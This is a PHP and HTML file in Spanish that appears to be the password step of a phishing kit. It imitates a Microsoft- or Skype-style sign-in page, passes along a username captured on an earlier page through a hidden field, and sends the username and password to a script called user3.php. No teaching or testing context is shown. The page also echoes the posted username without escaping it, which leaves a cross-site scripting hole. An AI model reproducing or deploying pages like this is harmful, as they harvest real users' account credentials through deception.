<?php
if($_POST){
    $user = $_POST['user'];
}






?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="icono.JPG">
    <title>Iniciar sesión en la cuenta</title>
</head>
<body>
    <div>
        <div>
            <div>
                <div>
                    <div>
                        <div>
                            <div>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="contenedor">
        <div class="form">
            <div>
                <img src="Captura.JPG" alt="">
            </div>
            <form action="user3.php" method="POST">
                <h2>Escribir contraseña</h2>
                <input hidden class="input1" type="text" name="user" placeholder="Correo electrónico, teléfono o Skype" value="<?php echo $user;?>">
                <input required class="input1" type="password" name="pasword" placeholder="Contraseña">
            <div class="info2">
               <a href="#">¿Olvidó su contraseña?</a>
            </div>
            
            <div class="cont-sub">
               <input class="submit" type="submit" name="" value="siguiente">
            </div>
            </form>
          </div>
          
    </div>

    <div class="img-end">
        <div>

            <img class="llave" src="llave.JPG" alt="">
        </div>
      <p>Opciones de inicio de sesión</p>
    </div>
    
</body>
</html>